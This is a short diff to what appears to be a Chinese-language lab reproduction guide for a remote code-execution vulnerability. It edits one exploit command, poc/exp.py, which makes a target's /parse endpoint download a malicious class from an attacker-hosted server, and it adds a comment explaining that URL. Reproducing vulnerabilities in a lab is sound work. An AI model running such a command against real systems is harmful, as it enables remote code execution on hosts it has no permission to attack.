@@ -37,7 +37,8 @@ cd poc/www && python3 -m http.server 19090
 ### Step 4: 命令执行验证
 
 ```bash
-python3 poc/exp.py -u http://127.0.0.1:18080/parse -poc http://127.0.0.1:19090/probe
+# -poc URL 是靶场容器去下载恶意 class 用的地址
+python3 poc/exp.py -u http://127.0.0.1:18080/parse -poc http://192.168.1.4:19090/probe
 ```
 
 ![exploit success](success.png)
